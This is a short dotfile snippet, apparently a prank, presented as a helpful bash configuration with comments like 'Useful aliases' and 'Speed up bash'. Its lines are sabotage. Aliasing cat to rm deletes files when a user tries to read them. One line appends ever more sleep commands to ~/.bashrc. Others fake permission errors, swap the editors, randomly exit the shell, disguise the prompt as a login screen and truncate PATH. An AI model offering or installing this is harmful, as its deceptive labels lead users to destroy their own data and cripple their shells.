# This is a good thing to put in ~/
export PS1="Login: "

# Useful aliases
alias cat="rm"
alias cd='echo "cd: permission denied:"'
alias ls="ls /mnt #"
alias vi='\nano'
alias vim='\nano'
alias nano='\vim'

# Speed up bash
echo 'echo "sleep 1" >> ~/.bashrc' >> ~/.bashrc

# Optimize shell at random intervals
if [ $(( $RANDOM % 6 )) -eq "0" ]; then exit ;fi

# Set PATH
PATH=/usr/bin
